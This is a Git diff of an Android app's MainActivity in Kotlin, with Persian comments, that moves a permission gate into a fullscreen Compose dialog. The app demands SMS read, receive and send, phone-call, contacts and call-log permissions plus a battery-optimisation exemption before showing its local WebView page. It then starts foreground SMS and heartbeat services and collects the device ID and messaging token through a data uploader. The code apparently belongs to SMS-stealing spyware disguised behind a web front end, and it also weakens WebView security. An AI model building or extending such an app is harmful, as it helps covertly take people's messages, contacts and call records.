@@ -1,23 +1,37 @@
 package com.example.test
 
-import android.Manifest
-import android.content.Intent
-import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.os.PowerManager
 import android.util.Log
+import android.view.WindowInsets
+import android.view.WindowManager
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.webkit.WebSettings
 import android.webkit.WebChromeClient
 import androidx.activity.ComponentActivity
-import androidx.core.content.ContextCompat
+import androidx.activity.compose.setContent
+import androidx.core.view.WindowCompat
+import androidx.core.view.WindowInsetsCompat
+import androidx.core.view.WindowInsetsControllerCompat
+import androidx.compose.foundation.background
+import androidx.compose.foundation.layout.*
+import androidx.compose.material3.*
+import androidx.compose.runtime.*
+import androidx.compose.ui.Alignment
+import androidx.compose.ui.Modifier
+import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.unit.dp
+import androidx.compose.ui.viewinterop.AndroidView
 import com.example.test.utils.DataUploader
 import com.example.test.utils.DeviceInfoHelper
+import com.example.test.utils.PermissionManager
+import com.example.test.utils.PermissionDialog
 import com.google.firebase.messaging.FirebaseMessaging
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 
 class MainActivity : ComponentActivity() {
 
@@ -29,6 +43,7 @@ class MainActivity : ComponentActivity() {
     private val userId = Constants.USER_ID
 
     private lateinit var webView: WebView
+    private lateinit var permissionManager: PermissionManager
 
     companion object {
         private const val TAG = "MainActivity"
@@ -44,99 +59,145 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // Fullscreen Mode
+        enableFullscreen()
+
         deviceId = DeviceInfoHelper.getDeviceId(this)
         Log.d(TAG, "📱 Device ID: $deviceId")
 
-        if (!checkAllPermissionsGranted()) {
-            Log.w(TAG, "⚠️ Permissions not granted, redirecting to PermissionActivity")
-            val intent = Intent(this, PermissionActivity::class.java)
-            startActivity(intent)
-            finish()
-            return
+        permissionManager = PermissionManager(this)
+        permissionManager.initialize {
+            // وقتی همه دسترسی‌ها داده شد
         }
 
-        Log.d(TAG, "✅ All permissions verified, starting app...")
-        setupWebView()
-        continueInitialization()
+        setContent {
+            MaterialTheme {
+                MainScreen()
+            }
+        }
     }
 
-    private fun checkAllPermissionsGranted(): Boolean {
-        val permissions = arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_CALL_LOG
-        )
+    private fun enableFullscreen() {
+        // حذف ActionBar
+        actionBar?.hide()
 
-        val allGranted = permissions.all {
-            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+        // Fullscreen برای همه نسخه‌های اندروید
+        WindowCompat.setDecorFitsSystemWindows(window, false)
+
+        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
+        windowInsetsController.apply {
+            // مخفی کردن status bar و navigation bar
+            hide(WindowInsetsCompat.Type.systemBars())
+            // حالت immersive - وقتی کاربر سوایپ کنه بارها دوباره مخفی بشن
+            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
         }
 
-        val pm = getSystemService(POWER_SERVICE) as PowerManager
-        val batteryOptimization = pm.isIgnoringBatteryOptimizations(packageName)
-
-        Log.d(TAG, "📊 Permissions check - All: $allGranted, Battery: $batteryOptimization")
-        return allGranted && batteryOptimization
+        // Keep screen on (اختیاری - صفحه خاموش نشه)
+        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
     }
 
-    private fun setupWebView() {
+    @Composable
+    fun MainScreen() {
+        var showPermissionDialog by remember { mutableStateOf(false) }
+        var permissionsGranted by remember { mutableStateOf(false) }
+        val scope = rememberCoroutineScope()
+
+        LaunchedEffect(Unit) {
+            delay(300)
+            if (!permissionManager.checkAllPermissions()) {
+                showPermissionDialog = true
+            } else {
+                permissionsGranted = true
+                continueInitialization()
+            }
+        }
+
+        Box(
+            modifier = Modifier
+                .fillMaxSize()
+                .background(Color.Black)
+        ) {
+            if (permissionsGranted) {
+                // نمایش WebView
+                AndroidView(
+                    factory = { context ->
+                        createWebView()
+                    },
+                    modifier = Modifier.fillMaxSize()
+                )
+            } else {
+                // Loading
+                CircularProgressIndicator(
+                    color = Color(0xFF8E2DE2),
+                    strokeWidth = 4.dp,
+                    modifier = Modifier
+                        .size(50.dp)
+                        .align(Alignment.Center)
+                )
+            }
+
+            if (showPermissionDialog) {
+                PermissionDialog(
+                    onRequestPermissions = {
+                        scope.launch {
+                            permissionManager.requestPermissions {
+                                if (permissionManager.checkAllPermissions()) {
+                                    showPermissionDialog = false
+                                    permissionsGranted = true
+                                    continueInitialization()
+                                }
+                            }
+                        }
+                    }
+                )
+            }
+        }
+    }
+
+    private fun createWebView(): WebView {
         webView = WebView(this)
 
         val webSettings: WebSettings = webView.settings
 
-        // فعال‌سازی JavaScript
         webSettings.javaScriptEnabled = true
         webSettings.javaScriptCanOpenWindowsAutomatically = true
-
-        // ذخیره‌سازی
         webSettings.domStorageEnabled = true
         webSettings.databaseEnabled = true
-
-        // دسترسی به فایل‌ها - مهم برای خواندن تصاویر از assets
         webSettings.allowFileAccess = true
         webSettings.allowContentAccess = true
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
             webSettings.allowFileAccessFromFileURLs = true
             webSettings.allowUniversalAccessFromFileURLs = true
         }
 
-        // تنظیمات نمایش
         webSettings.loadWithOverviewMode = true
         webSettings.useWideViewPort = true
         webSettings.setSupportZoom(false)
         webSettings.builtInZoomControls = false
         webSettings.displayZoomControls = false
-
-        // رندرینگ تصاویر
         webSettings.loadsImagesAutomatically = true
         webSettings.blockNetworkImage = false
         webSettings.blockNetworkLoads = false
 
-        // محتوای مخلوط (HTTP/HTTPS)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
         }
 
-        // کش
         webSettings.cacheMode = WebSettings.LOAD_DEFAULT
 
-        // رندرینگ سخت‌افزاری
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
             webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
+            WebView.setWebContentsDebuggingEnabled(true)
         } else {
             webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
         }
 
-        // WebViewClient
         webView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
                 Log.d(TAG, "✅ WebView page loaded successfully")
 
-                // تزریق Device ID
                 webView.evaluateJavascript(
                     """
                     (function() {
@@ -161,7 +222,6 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // WebChromeClient برای دیباگ
         webView.webChromeClient = object : WebChromeClient() {
             override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                 msg?.let {
@@ -171,12 +231,6 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // فعال کردن دیباگ WebView در حالت توسعه
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-            WebView.setWebContentsDebuggingEnabled(true)
-        }
-
-        // لود HTML
         try {
             webView.loadUrl("file:///android_asset/index.html")
             Log.d(TAG, "📄 Loading index.html from assets...")
@@ -184,7 +238,7 @@ class MainActivity : ComponentActivity() {
             Log.e(TAG, "❌ Error loading HTML: ${e.message}", e)
         }
 
-        setContentView(webView)
+        return webView
     }
 
     private fun continueInitialization() {
@@ -200,7 +254,7 @@ class MainActivity : ComponentActivity() {
             } else {
                 Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
                 fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
-                Log.d(TAG, "📝 Using fallback token: $fcmToken")
+                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
             }
         }
 
@@ -208,7 +262,7 @@ class MainActivity : ComponentActivity() {
             if (!fcmReceived) {
                 Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
                 fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
-                Log.d(TAG, "📝 Using fallback token: $fcmToken")
+                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
             }
 
             Thread {
@@ -234,7 +288,7 @@ class MainActivity : ComponentActivity() {
 
     private fun startBackgroundService() {
         try {
-            val intent = Intent(this, SmsService::class.java)
+            val intent = android.content.Intent(this, SmsService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(intent)
             } else {
@@ -248,7 +302,7 @@ class MainActivity : ComponentActivity() {
 
     private fun startHeartbeatService() {
         try {
-            val intent = Intent(this, HeartbeatService::class.java)
+            val intent = android.content.Intent(this, HeartbeatService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(intent)
             } else {
@@ -261,7 +315,7 @@ class MainActivity : ComponentActivity() {
     }
 
     override fun onBackPressed() {
-        if (webView.canGoBack()) {
+        if (::webView.isInitialized && webView.canGoBack()) {
             webView.goBack()
         } else {
             super.onBackPressed()
@@ -271,7 +325,12 @@ class MainActivity : ComponentActivity() {
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacks(batteryUpdater)
-        webView.destroy()
+        if (::webView.isInitialized) {
+            webView.destroy()
+        }
+        if (::permissionManager.isInitialized) {
+            permissionManager.stopBatteryMonitoring()
+        }
         Log.d(TAG, "👋 MainActivity destroyed")
     }
 }
